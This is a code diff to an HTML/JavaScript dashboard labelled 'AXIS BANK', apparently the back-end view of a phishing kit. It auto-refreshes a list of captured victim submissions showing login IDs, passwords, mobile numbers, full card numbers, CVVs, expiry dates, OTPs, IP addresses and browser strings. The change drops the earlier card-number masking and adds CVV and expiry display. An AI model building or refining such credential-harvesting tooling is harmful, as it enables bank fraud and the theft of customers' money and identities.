@@ -13,10 +13,16 @@
         }
         
         body {
-            background: #0f0f1a;
+            background: #f5f5f5;
             min-height: 100vh;
             overflow-x: hidden;
-            color: white;
+            color: #333;
+            animation: pageBlink 5s infinite;
+        }
+        
+        @keyframes pageBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.98; }
         }
         
         /* Password Login */
@@ -114,69 +120,38 @@
         .admin-panel {
             display: none;
             padding: 10px;
-            max-width: 1400px;
-            margin: 0 auto;
-            animation: pageBlink 5s infinite;
         }
         
-        @keyframes pageBlink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.98; }
-        }
-        
-        /* Header */
+        /* Header - Maroon Red */
         .panel-header {
-            background: linear-gradient(135deg, #87103F 0%, #2c0b0e 100%);
+            background: #87103F; /* Maroon Red */
             color: white;
             padding: 15px;
+            text-align: center;
             margin-bottom: 15px;
-            border-radius: 10px;
-            border: 1px solid #87103F;
+            border-radius: 0 0 15px 15px;
+            box-shadow: 0 4px 12px rgba(135, 16, 63, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
             animation: headerBlink 5s infinite;
         }
         
         @keyframes headerBlink {
-            0%, 100% { box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); }
-            50% { box-shadow: 0 5px 15px rgba(255, 71, 87, 0.3); }
-        }
-        
-        .header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
+            0%, 100% { background: #87103F; }
+            50% { background: #a0144a; }
         }
         
         .header-title {
-            font-size: 20px;
+            font-size: 24px;
             font-weight: bold;
-        }
-        
-        .stats-container {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .stat-box {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 6px 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .stat-value {
-            color: #ff4757;
-            font-weight: bold;
-            margin-left: 5px;
+            letter-spacing: 1px;
         }
         
         .refresh-info {
-            text-align: center;
-            font-size: 13px;
+            font-size: 12px;
             color: rgba(255, 255, 255, 0.8);
-            padding-top: 10px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            margin-top: 5px;
         }
         
         .blink-dot {
@@ -195,219 +170,248 @@
             50% { opacity: 0.3; }
         }
         
-        /* Submissions Container - White Background */
+        /* Vertical Submissions Container */
         .submissions-container {
-            background: white;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            padding: 5px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        /* Submission Cards - Different Colors */
+        .submission-card {
             border-radius: 10px;
             padding: 15px;
-            border: 1px solid #87103F;
-            max-height: 75vh;
-            overflow-y: auto;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-        
-        .submissions-header {
-            display: grid;
-            grid-template-columns: 50px 100px 200px 150px 150px 150px 150px 100px;
-            padding: 12px;
-            background: linear-gradient(135deg, #87103F 0%, #a0144a 100%);
-            border-radius: 8px;
-            margin-bottom: 10px;
-            font-weight: bold;
-            font-size: 12px;
-            color: white;
-            position: sticky;
-            top: 0;
-            z-index: 10;
-        }
-        
-        .submission-item {
-            display: grid;
-            grid-template-columns: 50px 100px 200px 150px 150px 150px 150px 100px;
-            padding: 12px;
-            margin-bottom: 8px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            border: 1px solid #e0e0e0;
-            transition: all 0.3s ease;
-            font-size: 12px;
-            color: #333;
-            animation: highlightEntry 0.5s ease-out;
-        }
-        
-        @keyframes highlightEntry {
-            0% { background: rgba(135, 16, 63, 0.3); }
-            100% { background: #f8f9fa; }
-        }
-        
-        .submission-item.new {
-            background: #fff3cd !important;
-            border: 1px solid #ffc107 !important;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+            animation: cardEntry 0.5s ease-out;
+            border-left: 5px solid;
             animation: newBlink 5s infinite;
         }
         
+        @keyframes cardEntry {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
         @keyframes newBlink {
-            0%, 100% { 
-                background: #fff3cd !important;
-                border-color: #ffc107 !important;
-            }
-            50% { 
-                background: #fffbeb !important;
-                border-color: #f59e0b !important;
-            }
+            0%, 100% { box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); }
+            50% { box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); }
         }
         
-        .submission-item:hover {
-            background: #e9ecef;
-            transform: translateY(-1px);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        /* Color Variations */
+        .card-green {
+            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+            border-left-color: #4CAF50;
         }
         
-        .submission-id {
-            color: #87103F;
+        .card-maroon {
+            background: linear-gradient(135deg, #fce4ec 0%, #f8bbd9 100%);
+            border-left-color: #87103F;
+        }
+        
+        .card-white {
+            background: linear-gradient(135deg, #ffffff 0%, #f5f5f5 100%);
+            border-left-color: #9e9e9e;
+        }
+        
+        .card-blue {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            border-left-color: #2196F3;
+        }
+        
+        .submission-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        /* Card Header */
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+        }
+        
+        .card-type {
             font-weight: bold;
-            font-size: 11px;
-        }
-        
-        .submission-type {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
             text-transform: uppercase;
-            font-weight: bold;
-            padding: 3px 6px;
-            border-radius: 4px;
-            display: inline-block;
-            text-align: center;
-            font-size: 11px;
         }
         
         .type-login {
-            background: #e8f5e9;
-            color: #2e7d32;
-            border: 1px solid #4CAF50;
+            background: #4CAF50;
+            color: white;
         }
         
         .type-credit {
-            background: #e3f2fd;
-            color: #1565c0;
-            border: 1px solid #2196F3;
+            background: #2196F3;
+            color: white;
         }
         
         .type-otp {
-            background: #fff8e1;
-            color: #ff8f00;
-            border: 1px solid #FFC107;
+            background: #FF9800;
+            color: white;
         }
         
-        .submission-field {
-            padding: 2px 0;
-        }
-        
-        .field-label {
+        .card-time {
+            font-size: 11px;
             color: #666;
-            font-size: 10px;
-            margin-bottom: 2px;
         }
         
-        .field-value {
-            color: #222;
-            font-weight: 500;
+        /* Card Content - Vertical Layout */
+        .card-content {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .data-row {
+            display: flex;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px dashed rgba(0, 0, 0, 0.1);
+        }
+        
+        .data-label {
+            width: 120px;
+            font-weight: 600;
+            color: #555;
+            font-size: 13px;
+        }
+        
+        .data-value {
+            flex: 1;
+            font-size: 14px;
             word-break: break-all;
-            font-size: 12px;
         }
         
-        .field-value.password {
-            color: #dc3545;
+        /* Special Styling for Sensitive Data */
+        .data-value.password {
+            color: #d32f2f;
             font-weight: bold;
-            background: #f8d7da;
-            padding: 1px 5px;
-            border-radius: 3px;
-            display: inline-block;
+            font-size: 16px;
+            background: #ffebee;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid #ffcdd2;
         }
         
-        .field-value.otp {
+        .data-value.otp {
             color: #87103F;
             font-weight: bold;
-            background: #ffebee;
-            padding: 1px 5px;
-            border-radius: 3px;
-            display: inline-block;
+            font-size: 18px;
+            background: #fff3e0;
+            padding: 5px 10px;
+            border-radius: 4px;
+            border: 1px solid #ffcc80;
             animation: otpBlink 2s infinite;
-            font-size: 14px;
+            text-align: center;
+            letter-spacing: 3px;
         }
         
         @keyframes otpBlink {
-            0%, 100% { background: #ffebee; }
-            50% { background: #ffcdd2; }
+            0%, 100% { background: #fff3e0; }
+            50% { background: #ffecb3; }
         }
         
-        .submission-time {
-            color: #666;
+        .data-value.card {
+            color: #1565c0;
+            font-weight: 500;
+            font-size: 14px;
+            font-family: monospace;
+            background: #f5f5f5;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid #e0e0e0;
+        }
+        
+        /* Card Footer */
+        .card-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+            padding-top: 8px;
+            border-top: 1px solid rgba(0, 0, 0, 0.1);
             font-size: 11px;
+            color: #666;
         }
         
-        .submission-ip {
-            color: #666;
-            font-size: 10px;
+        .ip-info {
             font-family: monospace;
         }
         
+        .browser-info {
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        /* No Data Message */
         .no-data {
             text-align: center;
-            padding: 40px;
+            padding: 50px 20px;
+            background: white;
+            border-radius: 10px;
+            border: 2px dashed #ddd;
             color: #666;
             font-style: italic;
             grid-column: 1 / -1;
-            background: white;
-            border-radius: 8px;
-            border: 2px dashed #ddd;
         }
         
         /* Responsive */
-        @media (max-width: 1200px) {
-            .submissions-header,
-            .submission-item {
-                grid-template-columns: 50px 80px 150px 130px 130px 130px 130px 80px;
-                font-size: 11px;
-            }
-        }
-        
-        @media (max-width: 992px) {
-            .submissions-container {
-                overflow-x: auto;
-            }
-            
-            .submissions-header,
-            .submission-item {
-                grid-template-columns: 50px 80px 180px 140px 140px 140px 140px 80px;
-                width: 1200px;
-            }
-        }
-        
         @media (max-width: 768px) {
-            .admin-panel {
-                padding: 5px;
-            }
-            
-            .header-top {
-                flex-direction: column;
+            .submissions-container {
+                padding: 10px;
                 gap: 10px;
-                text-align: center;
             }
             
-            .stats-container {
-                justify-content: center;
-                flex-wrap: wrap;
+            .submission-card {
+                padding: 12px;
+            }
+            
+            .card-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 5px;
+            }
+            
+            .card-time {
+                align-self: flex-end;
+            }
+            
+            .data-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 5px;
+            }
+            
+            .data-label {
+                width: 100%;
+            }
+            
+            .card-footer {
+                flex-direction: column;
+                gap: 5px;
+                align-items: flex-start;
             }
         }
         
-        /* Scrollbar styling */
+        /* Scrollbar */
         ::-webkit-scrollbar {
             width: 8px;
-            height: 8px;
         }
         
         ::-webkit-scrollbar-track {
-            background: rgba(0, 0, 0, 0.1);
-            border-radius: 4px;
+            background: #f1f1f1;
         }
         
         ::-webkit-scrollbar-thumb {
@@ -445,35 +449,16 @@
     <div class="admin-panel" id="adminPanel">
         <!-- Header -->
         <div class="panel-header">
-            <div class="header-top">
-                <div class="header-title">📊 AXIS BANK SUBMISSIONS - LIVE VIEW</div>
-                <div class="stats-container">
-                    <div class="stat-box">Total: <span class="stat-value" id="totalCount">0</span></div>
-                    <div class="stat-box">Today: <span class="stat-value" id="todayCount">0</span></div>
-                    <div class="stat-box">New: <span class="stat-value" id="newCount">0</span></div>
-                </div>
-            </div>
+            <div class="header-title">AXIS BANK</div>
             <div class="refresh-info">
                 <span class="blink-dot"></span>
                 Auto-refresh in: <span id="refreshTimer">5</span> seconds
             </div>
         </div>
         
-        <!-- Submissions List -->
-        <div class="submissions-container">
-            <div class="submissions-header">
-                <div>ID</div>
-                <div>Type</div>
-                <div>User ID/Email</div>
-                <div>Password</div>
-                <div>Mobile</div>
-                <div>Card/Details</div>
-                <div>OTP</div>
-                <div>Time</div>
-            </div>
-            <div id="submissionsList">
-                <div class="no-data">No submissions yet. Waiting for data...</div>
-            </div>
+        <!-- Submissions Container -->
+        <div class="submissions-container" id="submissionsList">
+            <div class="no-data">No submissions yet. Waiting for data...</div>
         </div>
     </div>
 
@@ -485,6 +470,9 @@
         let refreshInterval;
         let refreshTimer = 5;
         let currentSubmissions = [];
+        
+        // Color classes for cards
+        const cardColors = ['card-green', 'card-maroon', 'card-white', 'card-blue'];
         
         // Check login on load
         document.addEventListener('DOMContentLoaded', function() {
@@ -550,7 +538,6 @@
         function refreshData() {
             const submissions = loadSubmissions();
             displaySubmissions(submissions);
-            updateStats(submissions);
             refreshTimer = 5;
         }
         
@@ -566,32 +553,12 @@
             }
         }
         
-        // Update statistics
-        function updateStats(submissions) {
-            const total = submissions.length;
-            
-            const today = new Date().toDateString();
-            const todayCount = submissions.filter(sub => {
-                const subDate = new Date(sub.timestamp || sub.date).toDateString();
-                return subDate === today;
-            }).length;
-            
-            const newCount = submissions.filter(sub => {
-                const subTime = new Date(sub.timestamp || sub.date).getTime();
-                return (Date.now() - subTime) < 5 * 60 * 1000;
-            }).length;
-            
-            document.getElementById('totalCount').textContent = total;
-            document.getElementById('todayCount').textContent = todayCount;
-            document.getElementById('newCount').textContent = newCount;
-        }
-        
-        // Display submissions
+        // Display submissions in vertical layout
         function displaySubmissions(submissions) {
             const container = document.getElementById('submissionsList');
             
             if (!submissions || submissions.length === 0) {
-                container.innerHTML = '<div class="no-data">No submissions found in database</div>';
+                container.innerHTML = '<div class="no-data">No submissions yet. Waiting for data...</div>';
                 return;
             }
             
@@ -605,64 +572,114 @@
             let html = '';
             
             submissions.forEach((sub, index) => {
-                const subId = sub.id || `SUB${index + 1}`;
                 const subType = sub.type || 'unknown';
                 const timeString = formatTime(sub.timestamp || sub.date);
-                const isNew = sub.timestamp ? 
-                    (Date.now() - new Date(sub.timestamp).getTime()) < 5 * 60 * 1000 : 
-                    false;
                 
-                const typeClass = `type-${subType}`;
-                
-                // Get data fields based on submission type
-                let userId = '', password = '', mobile = '', card = '', otp = '';
+                // Get data fields
+                let userId = '', password = '', mobile = '', card = '', otp = '', 
+                    name = '', cvv = '', expiry = '', email = '';
                 
                 if (sub.data) {
-                    // Login type
+                    // Common fields
+                    userId = sub.data.loginId || sub.data.userId || sub.data.user || '';
+                    email = sub.data.email || '';
+                    password = sub.data.password || sub.data.pass || '';
+                    mobile = sub.data.mobile || sub.data.phone || sub.data.mobileNumber || '';
+                    
+                    // Login specific
                     if (sub.type === 'login') {
-                        userId = sub.data.loginId || sub.data.email || sub.data.userId || '';
-                        password = sub.data.password || sub.data.pass || '';
-                        mobile = sub.data.mobile || sub.data.phone || '';
+                        name = sub.data.name || '';
                     }
-                    // Credit card type
+                    // Credit card specific
                     else if (sub.type === 'credit') {
-                        userId = sub.data.name || sub.data.cardName || '';
-                        password = sub.data.cvv || sub.data.pin || '';
-                        mobile = sub.data.mobile || sub.data.cardMobile || '';
-                        card = sub.data.cardNumber ? formatCardNumber(sub.data.cardNumber) : '';
+                        name = sub.data.name || sub.data.cardName || '';
+                        card = sub.data.cardNumber || '';
+                        cvv = sub.data.cvv || sub.data.cvv2 || '';
+                        expiry = sub.data.expiry || sub.data.expiryDate || '';
                     }
-                    // OTP type
+                    // OTP specific
                     else if (sub.type === 'otp') {
-                        mobile = sub.data.mobileNumber || sub.data.mobile || '';
                         otp = sub.data.otp || '';
                     }
                 }
                 
+                // Select card color based on index
+                const colorClass = cardColors[index % cardColors.length];
+                
+                // Determine type class
+                let typeClass = 'type-login';
+                if (subType === 'credit') typeClass = 'type-credit';
+                if (subType === 'otp') typeClass = 'type-otp';
+                
                 html += `
-                    <div class="submission-item ${isNew ? 'new' : ''}">
-                        <div class="submission-id">${subId}</div>
-                        <div class="submission-type ${typeClass}">${subType}</div>
-                        <div class="submission-field">
-                            <div class="field-label">ID/Email</div>
-                            <div class="field-value">${userId || 'N/A'}</div>
+                    <div class="submission-card ${colorClass}">
+                        <div class="card-header">
+                            <div class="card-type ${typeClass}">${subType}</div>
+                            <div class="card-time">${timeString}</div>
                         </div>
-                        <div class="submission-field">
-                            <div class="field-label">Password/CVV</div>
-                            <div class="field-value password">${password || 'N/A'}</div>
+                        
+                        <div class="card-content">
+                            ${userId ? `
+                            <div class="data-row">
+                                <div class="data-label">User ID:</div>
+                                <div class="data-value">${userId}</div>
+                            </div>` : ''}
+                            
+                            ${email ? `
+                            <div class="data-row">
+                                <div class="data-label">Email:</div>
+                                <div class="data-value">${email}</div>
+                            </div>` : ''}
+                            
+                            ${password ? `
+                            <div class="data-row">
+                                <div class="data-label">Password:</div>
+                                <div class="data-value password">${password}</div>
+                            </div>` : ''}
+                            
+                            ${mobile ? `
+                            <div class="data-row">
+                                <div class="data-label">Mobile:</div>
+                                <div class="data-value">${mobile}</div>
+                            </div>` : ''}
+                            
+                            ${name ? `
+                            <div class="data-row">
+                                <div class="data-label">Name:</div>
+                                <div class="data-value">${name}</div>
+                            </div>` : ''}
+                            
+                            ${card ? `
+                            <div class="data-row">
+                                <div class="data-label">Card Number:</div>
+                                <div class="data-value card">${formatCardNumber(card)}</div>
+                            </div>` : ''}
+                            
+                            ${cvv ? `
+                            <div class="data-row">
+                                <div class="data-label">CVV:</div>
+                                <div class="data-value password">${cvv}</div>
+                            </div>` : ''}
+                            
+                            ${expiry ? `
+                            <div class="data-row">
+                                <div class="data-label">Expiry:</div>
+                                <div class="data-value">${expiry}</div>
+                            </div>` : ''}
+                            
+                            ${otp ? `
+                            <div class="data-row">
+                                <div class="data-label">OTP:</div>
+                                <div class="data-value otp">${otp}</div>
+                            </div>` : ''}
                         </div>
-                        <div class="submission-field">
-                            <div class="field-label">Mobile</div>
-                            <div class="field-value">${mobile || 'N/A'}</div>
+                        
+                        <div class="card-footer">
+                            <div class="ip-info">IP: ${sub.ip || 'N/A'}</div>
+                            <div class="browser-info" title="${sub.userAgent || ''}">
+                                ${sub.userAgent ? sub.userAgent.substring(0, 40) + '...' : 'Browser: N/A'}
+                            </div>
                         </div>
-                        <div class="submission-field">
-                            <div class="field-label">Card/Details</div>
-                            <div class="field-value">${card || 'N/A'}</div>
-                        </div>
-                        <div class="submission-field">
-                            <div class="field-label">OTP</div>
-                            <div class="field-value otp">${otp || 'N/A'}</div>
-                        </div>
-                        <div class="submission-time">${timeString}</div>
                     </div>
                 `;
             });
@@ -670,12 +687,14 @@
             container.innerHTML = html;
         }
         
-        // Format card number
+        // Format card number with spaces
         function formatCardNumber(cardNumber) {
             if (!cardNumber) return '';
+            // Remove all non-digits
             const cleaned = cardNumber.toString().replace(/\D/g, '');
-            if (cleaned.length <= 4) return cleaned;
-            return `****-****-****-${cleaned.slice(-4)}`;
+            // Format as XXXX XXXX XXXX XXXX
+            const parts = cleaned.match(/.{1,4}/g);
+            return parts ? parts.join(' ') : cleaned;
         }
         
         // Format time
@@ -689,7 +708,8 @@
                     minute: '2-digit',
                     second: '2-digit',
                     day: '2-digit',
-                    month: 'short'
+                    month: 'short',
+                    year: '2-digit'
                 });
             } catch (e) {
                 return timestamp;
